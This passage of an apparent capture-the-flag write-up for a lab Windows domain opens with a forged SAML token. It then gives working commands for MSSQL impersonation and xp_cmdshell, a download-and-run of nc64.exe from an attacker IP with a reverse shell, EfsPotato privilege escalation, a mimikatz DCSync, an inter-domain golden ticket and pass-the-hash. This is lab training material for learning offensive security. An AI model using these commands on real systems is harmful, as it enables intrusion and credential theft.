BMU0xrcCtlUlpvTUprdDdrMS9LWHREYXNPUW4wTnNnWUVvd0xCSW1NQ011OXV1am5DbUZPd0hQL0lCaGdZUU1IaDQ2QnpTWFdQM2k4VlhiclJ0RHBvL2MvL09GSmhHbW5uRjhaUG1pNHh0emZTREJwVktxd1ZMcDc4Q2d1TXhqUWQrYmRVYjQ1NTg4Wko0Q0xzUGRSUXAzMFdKMS9DTklhZW52Sld0QTJHNUladzVVMEVXQ0pMb1lKV0ZzOWl5T2ExL3k1NXJ1VzZKOGxJR0Qwd21vRWVDbDlDSDFFZDRkelVkVVhmMU1CQ1lQM1g5MmlheHpVRTB1cEdkLzFRbzZIVHl5T2xXdUF3cmtUMlZIRUxLVlpLT2c4K2RseTk3Z3laSWZVdFF3SWtQd05sOHZvMDRjZmoraHpPdkJ6UEtBQVloMTROTGd2ZUFJL0RxTW5PME9LTyt3MUhCS3c2NE5CQ244Z29hekYrUHVGZlVPMHlOSEZMNGt4TXBjYXA2aWV2NmczQlhDU0R3ZnFUVU9FdUVzN3E5b1lLZ3EycW5OVk9USWhoSW5NWEJ6RW02aVAxM2pmdU9vWEpkUEFuRVVYbjR5NXl3QTk3cnRiR25aRVB5eDFmMUVrWC9oYnFCUDR2b2d2OWtsdGFVRUVWWGtTK2hQcHhabWV4Q05yQkQxcTdHSi81MGViWWxDMENldjh3Nk1zOHRNME9ydnBwR1lsV3J0UHdldkV2ZmlSa3dCTEc3RU1BbkxTdz09PC9kczpYNTA5Q2VydGlmaWNhdGU%2BPC9kczpYNTA5RGF0YT48L2RzOktleUluZm8%2BPC9kczpTaWduYXR1cmU%2BPFN1YmplY3Q%2BPE5hbWVJRCBGb3JtYXQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjEuMTpuYW1laWQtZm9ybWF0OmVtYWlsQWRkcmVzcyI%2BQWRtaW5pc3RyYXRvckBnaG9zdC5odGI8L05hbWVJRD48U3ViamVjdENvbmZpcm1hdGlvbiBNZXRob2Q9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpjbTpiZWFyZXIiPjxTdWJqZWN0Q29uZmlybWF0aW9uRGF0YSBOb3RPbk9yQWZ0ZXI9IjIwMjUtMTAtMjJUMTI6MDY6MzAuMDAwWiIgUmVjaXBpZW50PSJodHRwczovL2NvcmUuZ2hvc3QuaHRiOjg0NDMvYWRmcy9zYW1sL3Bvc3RSZXNwb25zZSIvPjwvU3ViamVjdENvbmZpcm1hdGlvbj48L1N1YmplY3Q%2BPENvbmRpdGlvbnMgTm90QmVmb3JlPSIyMDI1LTEwLTIyVDEyOjAxOjMwLjAwMFoiIE5vdE9uT3JBZnRlcj0iMjAyNS0xMC0yMlQxMzowMTozMC4wMDBaIj48QXVkaWVuY2VSZXN0cmljdGlvbj48QXVkaWVuY2U%2BaHR0cHM6Ly9jb3JlLmdob3N0Lmh0Yjo4NDQzPC9BdWRpZW5jZT48L0F1ZGllbmNlUmVzdHJpY3Rpb24%2BPC9Db25kaXRpb25zPjxBdHRyaWJ1dGVTdGF0ZW1lbnQ%2BPEF0dHJpYnV0ZSBOYW1lPSJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy91cG4iPiA8QXR0cmlidXRlVmFsdWU%2BIEFkbWluaXN0cmF0b3JAZ2hvc3QuaHRiPC9BdHRyaWJ1dGVWYWx1ZT48L0F0dHJpYnV0ZT48QXR0cmlidXRlIE5hbWU9Imh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL2NsYWltcy9Db21tb25OYW1lIj4gPEF0dHJpYnV0ZVZhbHVlPkFkbWluaXN0cmF0b3I8L0F0dHJpYnV0ZVZhbHVlPjwvQXR0cmlidXRlPjwvQXR0cmlidXRlU3RhdGVtZW50PjxBdXRoblN0YXRlbWVudCBBdXRobkluc3RhbnQ9IjIwMjUtMTAtMjJUMTI6MDE6MjkuNTAwWiIgU2Vzc2lvbkluZGV4PSJfV1BEME9WIj48QXV0aG5Db250ZXh0PjxBdXRobkNvbnRleHRDbGFzc1JlZj51cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YWM6Y2xhc3NlczpQYXNzd29yZFByb3RlY3RlZFRyYW5zcG9ydDwvQXV0aG5Db250ZXh0Q2xhc3NSZWY%2BPC9BdXRobkNvbnRleHQ%2BPC9BdXRoblN0YXRlbWVudD48L0Fzc2VydGlvbj48L3NhbWxwOlJlc3BvbnNlPg%3D%3D
```
- attempt to login with `justin`
![[golden SAML attack.png]]
- forward requests until `POST` request to `/adfs/saml/postResponse`
- modify the `SAMLResponse` with generated response using `ADFSpoof.py`
![[db on core ghost.png]]
- the database is running `Microsoft SQL Server`
- while we on the database page we can attempt to enumerate for any credentials or privilege escalation
- first check the current user that we are running the command as 
```sql
select result from openquery("PRIMARY", 'select suser_name() as result')
```
- we get `bridge_corp` as the user 
- then check if current user has impersonate rights
```sql
select result from openquery("PRIMARY", 'select distinct b.name as result from
sys.server_permissions a inner join sys.server_principals b on
a.grantor_principal_id = b.principal_id where a.permission_name =
''IMPERSONATE'';')
```
- we get `sa` as the user that we can impersonate
- then we can proceed with impersonation and subsequently enabling the `xp_cmdshell` to perform a reverse shell
```bash
select result from openquery("PRIMARY", 'execute as login = ''sa''; select
suser_name() as result')
exec ('execute as login = ''sa''; exec sp_configure ''show advanced options'', 1;
reconfigure; exec sp_configure ''xp_cmdshell'', 1; reconfigure;') at "PRIMARY"
exec ('execute as login = ''sa''; exec xp_cmdshell ''whoami''') at "PRIMARY"
```
- loading `nc64.exe` to target and executing reverse shell
```sql
exec ('execute as login = ''sa''; exec xp_cmdshell ''curl.exe
http://10.10.14.82:8000/nc64.exe -o C:\windows\temp\nc64.exe''') at "PRIMARY"

exec ('execute as login = ''sa''; exec xp_cmdshell ''C:\windows\temp\nc64.exe -e
powershell 10.10.14.82 9000''') at "PRIMARY"
```

#### Privilege Escalation
- once we have a connection check the current user we are 
```bash
$ sudo rlwrap nc -lvnp 9000
listening on [any] 9000 ...
connect to [10.10.14.82] from (UNKNOWN) [10.129.231.105] 49789

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
PS C:\Windows\system32> whoami
whoami
nt service\mssqlserver
```
- check privileges
```bash
PS C:\Windows\system32> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
- at `nt service\mssqlserver` we have `SeIMpersonatePrivilege`
- we can abuse that privilege with `EfsPotato.exe`
- load the executable to target and run it with a reverse shell
```bash
PS C:\Windows\ServiceProfiles\MSSQLSERVER> .\EfsPotato.exe 'C:\windows\temp\nc64.exe 10.10.14.82 9001 -e powershell.exe'
.\EfsPotato.exe 'C:\windows\temp\nc64.exe 10.10.14.82 9001 -e powershell.exe'
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=7ced90)
[+] Get Token: 892
[!] process with pid: 2908 created.
==============================
```
- on our listener we get `nt authority\system` however that is not the end of the machine 
```powershell
$ rlwrap nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.82] from (UNKNOWN) [10.129.231.105] 49874
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\ServiceProfiles\MSSQLSERVER> whoami
whoami
nt authority\system
```
- we have gotten the admin account of the child domain which is `corp.ghost.htb`
```bash
PS C:\Windows\ServiceProfiles\MSSQLSERVER> (Get-CimInstance Win32_ComputerSystem).Domain


(Get-CimInstance Win32_ComputerSystem).Domain
corp.ghost.htb
```
- check domain relationship with `powerview`
```bash
PS C:\Users\Administrator\Desktop> get-domaintrust
get-domaintrust


SourceName      : corp.ghost.htb
TargetName      : ghost.htb
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 2/1/2024 2:33:33 AM
WhenChanged     : 10/22/2025 11:21:25 AM
```
- check with bloodhound
![[bloodhound trust relationships.png]]
- we will need to get admin account or admin access of the parent domain 
- to this we m will can perform a golden ticket attack 
- use `mimikatz.exe` to dump credentials 
```powershell
PS C:\Windows\ServiceProfiles\MSSQLSERVER> .\mimikatz.exe 'lsadump::dcsync /all /csv' exit > output
.\mimikatz.exe 'lsadump::dcsync /all /csv' exit > output
PS C:\Windows\ServiceProfiles\MSSQLSERVER> cat output
cat output

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /all /csv
[DC] 'corp.ghost.htb' will be the domain
[DC] 'PRIMARY.corp.ghost.htb' will be the DC server
[DC] Exporting domain 'corp.ghost.htb'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
502	krbtgt	69eb46aa347a8c68edb99be2725403ab	514
500	Administrator	41515af3ada195029708a53d941ab751	512
1000	PRIMARY$	27f92da5e3d79962020ddebc08ed7d70	532480
1103	GHOST$	674522a12782e4794d3b371764c37b24	2080

mimikatz(commandline) # exit
Bye!

```
- from the output we see that `GHOST$` has `UAC` 2080 which means its a `interdomain` account 
- we can then use this account to to create the golden ticket
- we will need to get the `SID` of both domains 
- we can get it by looking up the domain in `bloodhound`
- `parent SID`
![[sid of parent.png]]
- child `SID`
![[sid of child.png]]
- craft a `tgt` golden ticket using the `GHOST$` `interdomain` account hash with the `parent & child SID` targeting `enterprise admin privilege` with the `krbtgt` service account
```bash
$ ticketer.py -nthash 674522a12782e4794d3b371764c37b24 -domain-sid S-1-5-21-2034262909-2733679486-179904498 -domain corp.ghost.htb -extra-sid S-1-5-21-4084500788-938703357-3654145966-519 -spn krbtgt/ghost.htb attacker 
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for corp.ghost.htb/attacker
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in attacker.ccache
```
- then we can use the `tgt` to get `st` for `cifs` as `attacker@ghost.htb`
```bash
$ KRB5CCNAME=./attacker.ccache getST.py -k -no-pass -spn cifs/dc01.ghost.htb ghost.htb/attacker@ghost.htb
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting ST for user
[*] Saving ticket in attacker@ghost.htb@cifs_dc01.ghost.htb@GHOST.HTB.ccach
```
- then we can use the `st` to dump the credentials of parent domain 
```bash
$ KRB5CCNAME=attacker@ghost.htb@cifs_dc01.ghost.htb@GHOST.HTB.ccache secretsdump.py -k -no-pass -just-dc attacker@dc01.ghost.htb
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1cdb17d5c14ff69e7067cffcc9e470bd:::
```
- use the admin hash to get reverse shell to parent domain controller
```bash
$ evil-winrm -i 10.129.231.105 -u Administrator -H "1cdb17d5c14ff69e7067cffcc9e470bd"
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Desktop> (Get-CimInstance Win32_ComputerSystem).Domain
ghost.htb
```
#### Resources

#### Lesson Learned
